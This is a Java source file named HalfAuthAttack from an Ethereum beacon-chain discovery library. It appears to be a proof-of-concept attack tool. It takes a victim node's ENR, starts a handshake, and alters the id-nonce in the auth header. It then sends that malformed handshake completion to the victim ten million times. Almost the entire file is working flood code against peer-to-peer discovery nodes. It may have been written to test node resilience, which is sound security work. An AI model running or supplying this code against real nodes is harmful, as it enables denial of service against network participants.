package org.ethereum.beacon.discovery;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.tuweni.bytes.Bytes;
import org.ethereum.beacon.discovery.packet.AuthHeaderMessagePacket;
import org.ethereum.beacon.discovery.schema.IdentitySchemaV4Interpreter;
import org.ethereum.beacon.discovery.schema.NodeRecord;
import org.ethereum.beacon.discovery.schema.NodeRecordBuilder;
import org.ethereum.beacon.discovery.schema.NodeRecordFactory;
import org.ethereum.beacon.discovery.util.Functions;
import org.ethereum.beacon.discovery.util.Utils;
import org.web3j.crypto.ECKeyPair;
import org.web3j.rlp.RlpDecoder;
import org.web3j.rlp.RlpEncoder;
import org.web3j.rlp.RlpList;
import org.web3j.rlp.RlpString;
import org.web3j.rlp.RlpType;

import java.net.BindException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.function.Function;

import static org.ethereum.beacon.discovery.util.Functions.PRIVKEY_SIZE;

public class HalfAuthAttack {
    public static final String LOCALHOST = "127.0.0.1";
    private static final Logger logger = LogManager.getLogger();
    private static List<DiscoverySystem> managers = new ArrayList<>();
    ExecutorService executor = Executors.newFixedThreadPool(4);

    public static void main(String[] args) throws Exception {
        if (args.length == 0) {
            throw new RuntimeException("Please provide victim's ENR");
        }
        String enr = args[0];
        if (enr.startsWith("enr:")) {
            enr = enr.substring(4);
        }
        CompletableFuture<Void> passed = new CompletableFuture<>();
        final NodeRecord server = new NodeRecordFactory(new IdentitySchemaV4Interpreter()).fromBase64(enr);
        final DiscoverySystem client = createDiscoveryClient(server);
        Long start = System.nanoTime();
//        CompletableFuture<Void> neverCompleted = new CompletableFuture<>();
        client.startHandshake(server).thenApply(packet -> {
            System.out.println("Got packet, sending malformed AuthHeaderMessage packets");
            AuthHeaderMessagePacket modified = corruptAuthHeader(packet);
            for (int i = 0; i < 10000000; ++i) {
//                executor.submit(() -> {
                client.completeHandshake(modified, server);
//                });
                if (i % 1000 == 0) {
                    System.out.println(i + " requests sent");
                }
            }
            System.out.println("Total time: " + (System.nanoTime() - start) / 1_000_000L + "ms");
            return packet;
        }).thenApply((Function<AuthHeaderMessagePacket, Void>) original -> {
            client.completeHandshake(original, server).thenApply(unused -> {
                passed.complete(null);
                return null;
            });
            return null;
        });

        waitFor(passed, 600);
    }

    private static AuthHeaderMessagePacket corruptAuthHeader(AuthHeaderMessagePacket packet) {
        Bytes correctAuthHeader = packet.getAuthHeader();
        RlpList list = RlpDecoder.decode(correctAuthHeader.toArray());
        RlpList insideList = (RlpList) list.getValues().get(0);
        RlpString correctIdNonce  = (RlpString) insideList.getValues().get(1);
        byte[] idNonceBytes2 = correctIdNonce.getBytes();
        if (idNonceBytes2[idNonceBytes2.length - 1]  == (byte) 134) {
            idNonceBytes2[idNonceBytes2.length - 1] = (byte) 133;
        } else {
            idNonceBytes2[idNonceBytes2.length - 1] = (byte) 134;
        }
        RlpString incorrectIdNonce = RlpString.create(idNonceBytes2);
        List<RlpType> badHeader = new ArrayList<>();
        badHeader.add(insideList.getValues().get(0));
        badHeader.add(incorrectIdNonce);
        badHeader.add(insideList.getValues().get(2));
        badHeader.add(insideList.getValues().get(3));
        badHeader.add(insideList.getValues().get(4));

        return AuthHeaderMessagePacket.create(
                packet.getTag(),
                Bytes.wrap(RlpEncoder.encode(new RlpList(badHeader))),
                packet.getEncryptedMessage()
        );
    }

    private static DiscoverySystem createDiscoveryClient(final NodeRecord... bootnodes) throws Exception {
        return createDiscoveryClient(true, bootnodes);
    }

    private static DiscoverySystem createDiscoveryClient(
            final boolean signNodeRecord, final NodeRecord... bootnodes) throws Exception {
        return createDiscoveryClient(
                signNodeRecord, LOCALHOST, Functions.generateECKeyPair(), bootnodes);
    }

    private static DiscoverySystem createDiscoveryClient(
            final boolean signNodeRecord,
            final String ipAddress,
            final ECKeyPair keyPair,
            final NodeRecord... bootnodes)
            throws Exception {
        final Bytes privateKey =
                Bytes.wrap(Utils.extractBytesFromUnsignedBigInt(keyPair.getPrivateKey(), PRIVKEY_SIZE));

        int maxPort = 9000 + 10;
        for (int port = 9001; port < maxPort; port++) {
            final NodeRecordBuilder nodeRecordBuilder = new NodeRecordBuilder();
            if (signNodeRecord) {
                nodeRecordBuilder.privateKey(privateKey);
            } else {
                // We're not signing the record so use an identity schema that won't check the
                // signature locally. The other side should still validate it.
                nodeRecordBuilder.nodeRecordFactory(
                        new NodeRecordFactory(new IdentitySchemaV4Interpreter()));
            }
            final NodeRecord nodeRecord =
                    nodeRecordBuilder
                            .address(ipAddress, port)
                            .publicKey(Functions.derivePublicKeyFromPrivate(privateKey))
                            .build();
            final DiscoverySystem discoverySystem =
                    new DiscoverySystemBuilder()
                            .localNodeRecord(nodeRecord)
                            .privateKey(privateKey)
                            .bootnodes(bootnodes)
                            .build();
            try {
                waitFor(discoverySystem.start());
                managers.add(discoverySystem);
                return discoverySystem;
            } catch (final Exception e) {
                discoverySystem.stop();
                if (e.getCause() instanceof BindException) {
                    logger.info("Port conflict detected, retrying with new port", e);
                } else {
                    throw e;
                }
            }
        }
        throw new IllegalStateException("Could not find a free port after multiple attempts");
    }

    private static void waitFor(final CompletableFuture<?> future) throws Exception {
        waitFor(future, 30);
    }

    private static void waitFor(final CompletableFuture<?> future, final int timeout) throws Exception {
        future.get(timeout, TimeUnit.SECONDS);
    }
}
